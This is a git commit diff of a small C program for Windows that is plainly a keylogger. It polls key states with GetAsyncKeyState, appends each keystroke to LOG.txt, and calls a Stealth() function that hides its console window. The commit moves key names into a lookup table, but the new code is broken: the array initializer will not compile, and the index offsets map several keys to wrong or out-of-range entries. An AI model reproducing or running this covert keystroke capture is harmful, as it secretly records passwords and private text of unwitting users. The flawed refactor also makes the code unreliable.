ebb6509ce6b3337967ef8d6e74b7a3fb602faad2
Pro-Panda <f2016015@pilani.bits-pilani.ac.in>
2017-11-19 12:24:14 +0530

    Update: Using Array for storing special keystrokes, Update: Changed Brace Style

--- main.c
+++ main.c
@@ -5,14 +5,22 @@
 int Save (int key_stroke, char *file);
 int Stealth();
 
-int main() 
-{
+char KEY_TABLE[61][10] = [
+        "[Back]", "[TAB]", "[N \n]", "[SHIFT]", "[CTRL]", "[ALT]", "[BRK]", "[C LOCK]", 
+        "[ESC]", "[PG UP]", "[PG DN]", "[HOME]", "[LEFT]", "[UP]", "[RIGHT]", "[DOWN]",
+        "[prtscr]", "[INSERT]","[DEL]","[Super]","[SuperR]", "[N 0]", "[N 1]", "[N 2]",
+        "[N 3]", "[N 4]", "[N 5]", "[N 6]", "[N 7]", "[N 8]", "[N 9]", "[N *]",
+        "[N +]", "[N -]", "[N .]", "[N /]", "[F1]", "[F2]", "[F3]", "[F4]",
+        "[F5]", "[F6]", "[F7]", "[F8]", "[F9]", "[F10]", "[F11]", "[F11]",
+        "[N LOCK]","[S LOCK]",";", "=", ",", "-", ".", "/",
+        "`", "[", "\\", "]", "\""
+];
+
+int main(){
     Stealth(); 
     int i;
-    while (1)
-    {
-        for(i = 8; i <= 190; i++)
-        {
+    while (1){
+        for(i = 8; i <= 190; i++){
             if (GetAsyncKeyState(i) == -32767)
             Save (i,"LOG.txt"); 
         }
@@ -21,160 +29,35 @@ int main()
     return 0;
 }
 
-int Save (int key_stroke, char *file)
-{
+int Save (int key_stroke, char *file){
     if (key_stroke <= 7)
-    return 0;
+        return 0;
+    FILE *OUTPUT_FILE = fopen(file, "a+");
 
-    FILE *OUTPUT_FILE;
-    OUTPUT_FILE = fopen(file, "a+");
-
-    printf("%d" , & key_stroke);
-    printf("\n");
-    if(key_stroke)
-    if (key_stroke == 8)
-    fprintf(OUTPUT_FILE, "%s", "[Back]");
-    else if (key_stroke == 9)
-    fprintf(OUTPUT_FILE, "%s", "[TAB]");
-    else if (key_stroke == 13)
-    fprintf(OUTPUT_FILE, "%s", "[N \n]");
-    else if (key_stroke == 16)
-    fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
-    else if (key_stroke == 17)
-    fprintf(OUTPUT_FILE, "%s", "[CTRL]");
-    else if (key_stroke == 18)
-    fprintf(OUTPUT_FILE, "%s", "[ALT]");
-    else if (key_stroke == 19)
-    fprintf(OUTPUT_FILE, "%s", "[PAUSE/BREAK]");
-    else if (key_stroke == 20)
-    fprintf(OUTPUT_FILE, "%s", "[C LOCK]");
+    if (key_stroke < 10)
+        fprintf(OUTPUT_FILE, "%s", KEY_TABLE[key_stroke - 8]);
+    else if (key_stroke >= 13 && key_stroke <= 20)
+        fprintf(OUTPUT_FILE, "%s", KEY_TABLE[key_stroke-11]);
     else if (key_stroke == 27)
-    fprintf(OUTPUT_FILE, "%s", "[ESC]");
-    else if (key_stroke == 32)
-    fprintf(OUTPUT_FILE, "%s", " ");
-    else if (key_stroke == 33)
-    fprintf(OUTPUT_FILE, "%s", "[PAGE UP]");
-    else if (key_stroke == 34)
-    fprintf(OUTPUT_FILE, "%s", "[PAGE DOWN]");
-    else if (key_stroke == 35)
-    fprintf(OUTPUT_FILE, "%s", "[END]");
-    else if (key_stroke == 36)
-    fprintf(OUTPUT_FILE, "%s", "[HOME]");
-    else if (key_stroke == 37)
-    fprintf(OUTPUT_FILE, "%s", "[LEFT]");
-    else if (key_stroke == 38)
-    fprintf(OUTPUT_FILE, "%s", "[UP]");
-    else if (key_stroke == 39)
-    fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
-    else if (key_stroke == 40)
-    fprintf(OUTPUT_FILE, "%s", "[DOWN]");
-    else if (key_stroke == 44)
-    fprintf(OUTPUT_FILE, "%s", "[prntscr]");
-    else if (key_stroke == 45)
-    fprintf(OUTPUT_FILE, "%s", "[INSERT]");
-    else if (key_stroke == 46)
-    fprintf(OUTPUT_FILE, "%s", "[DEL]");
-    else if (key_stroke == 91)
-    fprintf(OUTPUT_FILE, "%s", "[Super]");
-    else if (key_stroke == 92)
-    fprintf(OUTPUT_FILE, "%s", "[SuperR]");
-    else if (key_stroke == 93)
-    fprintf(OUTPUT_FILE, "%s", "[optnskey]");
-    else if (key_stroke == 96)
-    fprintf(OUTPUT_FILE, "%s", "[N 0]");
-    else if (key_stroke == 97)
-    fprintf(OUTPUT_FILE, "%s", "[N 1]");
-    else if (key_stroke == 98)
-    fprintf(OUTPUT_FILE, "%s", "[N 2]");
-    else if (key_stroke == 99)
-    fprintf(OUTPUT_FILE, "%s", "[N 3]");
-    else if (key_stroke == 100)
-    fprintf(OUTPUT_FILE, "%s", "[N 4]");
-    else if (key_stroke == 101)
-    fprintf(OUTPUT_FILE, "%s", "[N 5]");
-    else if (key_stroke == 102)
-    fprintf(OUTPUT_FILE, "%s", "[N 6]");
-    else if (key_stroke == 103)
-    fprintf(OUTPUT_FILE, "%s", "[N 7]");
-    else if (key_stroke == 104)
-    fprintf(OUTPUT_FILE, "%s", "[N 8]");
-    else if (key_stroke == 105)
-    fprintf(OUTPUT_FILE, "%s", "[N 9]");
-    else if (key_stroke == 106)
-    fprintf(OUTPUT_FILE, "%s", "[N *]");
-    else if (key_stroke == 107)
-    fprintf(OUTPUT_FILE, "%s", "[N +]");
-    else if (key_stroke == 109)
-    fprintf(OUTPUT_FILE, "%s", "[N -]");
-    else if (key_stroke == 110)
-    fprintf(OUTPUT_FILE, "%s", "[N . ]");
-    else if (key_stroke == 111)
-    fprintf(OUTPUT_FILE, "%s", "[/]");
-    else if (key_stroke == 112)
-    fprintf(OUTPUT_FILE, "%s", "[F1]");
-    else if (key_stroke == 113)
-    fprintf(OUTPUT_FILE, "%s", "[F2]");
-    else if (key_stroke == 114)
-    fprintf(OUTPUT_FILE, "%s", "[F3]");
-    else if (key_stroke == 115)
-    fprintf(OUTPUT_FILE, "%s", "[F4]");
-    else if (key_stroke == 116)
-    fprintf(OUTPUT_FILE, "%s", "[F5]");
-    else if (key_stroke == 117)
-    fprintf(OUTPUT_FILE, "%s", "[F6]");
-    else if (key_stroke == 118)
-    fprintf(OUTPUT_FILE, "%s", "[F7]");
-    else if (key_stroke == 119)
-    fprintf(OUTPUT_FILE, "%s", "[F8]");
-    else if (key_stroke == 120)
-    fprintf(OUTPUT_FILE, "%s", "[F9]");
-    else if (key_stroke == 121)
-    fprintf(OUTPUT_FILE, "%s", "[F10]");
-    else if (key_stroke == 122)
-    fprintf(OUTPUT_FILE, "%s", "[F11]");
-    else if (key_stroke == 123)
-    fprintf(OUTPUT_FILE, "%s", "[F12]");
-    else if (key_stroke == 124)
-    fprintf(OUTPUT_FILE, "%s", "[F13]");
-    else if (key_stroke == 125)
-    fprintf(OUTPUT_FILE, "%s", "[F14]");
-    else if (key_stroke == 126)
-    fprintf(OUTPUT_FILE, "%s", "[F15]");
-    else if (key_stroke == 144)
-    fprintf(OUTPUT_FILE, "%s", "[N LOCK]");
-    else if (key_stroke == 145)
-    fprintf(OUTPUT_FILE, "%s", "[S LOCK]");
-    else if (key_stroke == 186)
-    fprintf(OUTPUT_FILE, "%s", ";");
-    else if (key_stroke == 187)
-    fprintf(OUTPUT_FILE, "%s", "=");
-    else if (key_stroke == 188)
-    fprintf(OUTPUT_FILE, "%s", ",");
-    else if (key_stroke == 189)
-    fprintf(OUTPUT_FILE, "%s", "-");
-    else if (key_stroke == 190)
-    fprintf(OUTPUT_FILE, "%s", ".");
-    else if (key_stroke == 191)
-    fprintf(OUTPUT_FILE, "%s", "/");
-    else if (key_stroke == 192)
-    fprintf(OUTPUT_FILE, "%s", "`");
-    else if (key_stroke == 219)
-    fprintf(OUTPUT_FILE, "%s", "[");
-    else if (key_stroke == 220)
-    fprintf(OUTPUT_FILE, "%s", "\\");
-    else if (key_stroke == 221)
-    fprintf(OUTPUT_FILE, "%s", "]");
-    else if (key_stroke == 222)
-    fprintf(OUTPUT_FILE, "%s", "\"");
+        fprintf(OUTPUT_FILE, "%s", KEY_TABLE[8]);
+    else if (key_stroke >= 33 && key_stroke <=46)
+        fprintf(OUTPUT_FILE, "%s", KEY_TABLE[key_stroke-28]);
+    else if (key_stroke >= 91 && key_stroke <= 126)
+        fprintf(OUTPUT_FILE, "%s", KEY_TABLE[key_stroke-72]);
+    else if (key_stroke >= 144 && key_stroke <=145)
+        fprintf(OUTPUT_FILE, "%s", KEY_TABLE[key_stroke-96]);
+    else if (key_stroke >= 186 && key_stroke <= 192)
+        fprintf(OUTPUT_FILE, "%s", KEY_TABLE[key_stroke-136]);
+    else if (key_stroke >= 219 && key_stroke <=222)
+        fprintf(OUTPUT_FILE, "%s", KEY_TABLE[key_stroke-162]);
     else
-    fprintf(OUTPUT_FILE, "%s", &key_stroke);
+        fprintf(OUTPUT_FILE, "%s", &key_stroke);
 
     fclose (OUTPUT_FILE);
     return 0;
 }
 
-int Stealth()
-{
+int Stealth(){
     HWND Stealth;
     AllocConsole();
     Stealth = FindWindowA("ConsoleWindowClass", NULL);
